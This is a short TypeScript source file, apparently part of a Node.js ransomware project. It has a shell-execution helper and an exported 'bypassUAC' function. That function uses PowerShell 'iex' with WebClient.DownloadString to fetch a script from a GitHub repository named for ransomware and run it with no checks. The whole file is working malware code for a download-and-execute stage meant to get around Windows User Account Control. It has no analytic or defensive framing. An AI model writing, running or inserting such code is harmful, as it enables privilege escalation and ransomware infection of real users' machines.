import { exec } from 'child_process';

const executeCommand = (
  command: string,
  usePowerShell: boolean = false,
): Promise<string> => {
  return new Promise((resolve, reject) => {
    const shell = usePowerShell ? 'powershell.exe' : 'cmd.exe';
    const commandToRun = usePowerShell
      ? `-Command ${command}`
      : `/c ${command}`;

    exec(`${shell} ${commandToRun}`, (error, stdout, stderr) => {
      if (error) {
        reject(`Erro ao executar "${command}": ${error.message}`);
        return;
      }
      if (stderr) {
        reject(`Erro (stderr) ao executar "${command}": ${stderr}`);
        return;
      }
      resolve(stdout.trim());
    });
  });
};

const bypassUAC = async () => {
  await executeCommand(
    "iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/ek1l/Ransomware-Nodejs/refs/heads/main/tools/msi.ps1')",
    true,
  );
  console.log('>>>>>>>>>>>>>>>>>>>>>>>>>>');
};

export default bypassUAC;
